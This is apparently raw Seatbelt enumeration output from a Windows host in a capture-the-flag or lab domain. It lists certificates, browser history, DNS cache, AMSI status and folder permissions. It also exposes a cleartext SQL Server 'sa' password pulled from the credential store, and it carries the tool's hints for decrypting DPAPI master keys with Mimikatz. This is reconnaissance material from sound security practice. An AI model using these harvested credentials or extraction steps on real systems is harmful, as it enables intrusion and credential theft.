CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumBookmarks ======

====== ChromiumHistory ======

History (C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Default\History):

  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=mssql+native+client+2012&cvid=7990a849e9954cb9bd0eacf1fecd0163&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDE5MTVqMGoxqAIBsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=mssql+native+client+2012&cvid=7990a849e9954cb9bd0eacf1fecd0163&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDE5MTVqMGoxqAIBsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U5310
  https://login.microsoftonline.com/
  https://learn.microsoft.com/
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releaseshttps://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.microsoft.com/
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.bing.com/
  https://www.microsoft.com/
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.bing.com/
  https://download.microsoft.com/download/A/9/8/A98CF446-A38E-4B0A-A967-F93FAB474AE0/en-US/18.2.3.0/x64/msoledbsql.msi4
  http://go.microsoft.com/fwlink/
  http://go.microsoft.com/fwlink/
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=mssql+native+client+2012&FORM=ANAB01&PC=U531mssql
  https://www.bing.com/search?q=mssql+native+client+2012&FORM=ANAB01&PC=U531mssql
  https://www.bing.com/search?q=sql+server+2017+installation+media&FORM=ANAB01&PC=U531sql
  https://www.bing.com/search?q=sql+server+2017+installation+media&FORM=ANAB01&PC=U531sql
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667d
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16https://learn.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667d
  https://www.bing.com/ck/a?
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releaseshttps://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531ole
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dDownload
  https://www.bing.com/ck/a?
  https://go.microsoft.com/fwlink/p/?linkid=2196047&clcid=0x409&culture=en-us&country=usSQL
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U531sql
  https://support.microsoft.com/en-us/silentsigninhandler
  https://support.microsoft.com/signin-oidc
  https://support.microsoft.com/en-us/topic/kb5042217-description-of-the-security-update-for-sql-server-2017-gdr-september-10-2024-664b5d51-c175-4da1-8c65-e678797b34baKB5042217
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://techcommunity.microsoft.com/t5/sql-server-blog/odbc-driver-17-for-sql-server-released/ba-p/385825ODBC
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releasesRelease
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16Download
  https://learn.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-ver16Microsoft
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releases
  https://info.microsoft.com/ww-landing-sql-server-2017-rtm.html
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531

====== ChromiumPresence ======


  C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Default\

    'History'     (9/19/2024 6:31:52 AM)  :  Run the 'ChromiumHistory' command
====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

  Target              : Microsoft:SSMS:18:WEB01:sa:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
  UserName            : sa
  Password            : MySAisL33TM4n
  CredentialType      : Generic
  PersistenceType     : LocalComputer
  LastWriteTime       : 9/27/2024 7:05:04 AM

  Target              : Microsoft:SSMS:18:::00000000-0000-0000-0000-000000000000:0
  UserName            :
  Password            :
  CredentialType      : Generic
  PersistenceType     : LocalComputer
  LastWriteTime       : 9/27/2024 7:04:28 AM

====== CredGuard ======

====== dir ======

  LastAccess LastWrite  Size      Path

  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Music\
  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Pictures\
  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Videos\
  20-10-02   20-10-02   0B        C:\Users\svc_dev\Documents\SQL Server Management Studio\
  20-10-02   20-10-02   0B        C:\Users\svc_dev\Documents\Visual Studio 2017\
  26-03-24   26-03-24   151KB     C:\Users\svc_dev\Desktop\._cache_SharpDPAPI.exe
  26-03-24   26-03-24   7.5KB     C:\Users\svc_dev\Desktop\ascension.exe
  26-03-24   26-03-24   10.1MB    C:\Users\svc_dev\Desktop\chisel.exe
  20-10-14   20-10-14   34B       C:\Users\svc_dev\Desktop\flag.txt
  26-03-24   26-03-24   277.8KB   C:\Users\svc_dev\Desktop\Invoke-Seatbelt.ps1
  26-03-24   26-03-24   904.5KB   C:\Users\svc_dev\Desktop\SharpDPAPI.exe
  19-10-08   19-10-08   0B        C:\Users\Public\Documents\My Music\
  19-10-08   19-10-08   0B        C:\Users\Public\Documents\My Pictures\
  19-10-08   19-10-08   0B        C:\Users\Public\Documents\My Videos\
  24-09-18   24-09-18   2.3KB     C:\Users\Public\Desktop\Microsoft Edge.lnk
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Music\
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Pictures\
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Videos\
====== DNSCache ======

  Entry                          : _ldap._tcp.default-first-site-name._sites.dc._msdcs.daedalus.local
  Name                           : _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.daedalus.local
  Data                           : dc1.daedalus.local 0 100 389

  Entry                          : _ldap._tcp.default-first-site-name._sites.dc._msdcs.daedalus.local
  Name                           : dc1.daedalus.local
  Data                           : 192.168.10.6

  Entry                          : _ldap._tcp.default-first-site-name._sites.dc._msdcs.daedalus.local
  Name                           : dc1.daedalus.local
  Data                           : 192.168.11.6

  Entry                          : dc1.daedalus.local
  Name                           : DC1.daedalus.local
  Data                           : 192.168.10.6

  Entry                          : dc1.daedalus.local
  Name                           : DC1.daedalus.local
  Data                           : 192.168.11.6

  Entry                          : dc1.daedalus.local
  Name                           : DC1.daedalus.local
  Data                           : 192.168.10.6

  Entry                          : dc1.daedalus.local
  Name                           : DC1.daedalus.local
  Data                           : 192.168.11.6

  Entry                          : dc1
  Name                           : DC1.daedalus.local
  Data                           : 192.168.10.6

  Entry                          : dc1
  Name                           : DC1.daedalus.local
  Data                           : 192.168.11.6

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.7.03190

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : False
====== DpapiMasterKeys ======

  Folder : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    1/10/2020 5:27:02 AM      1/10/2020 5:27:02 AM      29C91D6E-339C-4E04-9796-F43ACA8E1AF3
    1/10/2020 5:27:02 AM      1/10/2020 5:27:02 AM      2bf4cfc9-5473-4c95-8514-35861fcbf022
    9/17/2024 5:57:58 AM      9/17/2024 5:57:58 AM      67f368d2-3d19-4912-89fc-643c7288b37d
    10/19/2020 9:45:48 AM     10/19/2020 9:45:48 AM     93d13701-6d0b-4909-987f-daeb8e1a06df
    7/20/2020 2:40:18 AM      7/20/2020 2:40:18 AM      a6d61830-7389-4ede-b859-3142a0db5d7f
    4/2/2021 7:08:44 AM       4/2/2021 7:08:44 AM       dd067335-9e4c-441b-a3cd-a35c0be3418a


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== EnvironmentPath ======

  Name                           : C:\Program Files\PHP\v7.3
  SDDL                           : O:BAD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\140\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\140\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\130\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\110\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\120\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\130\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\
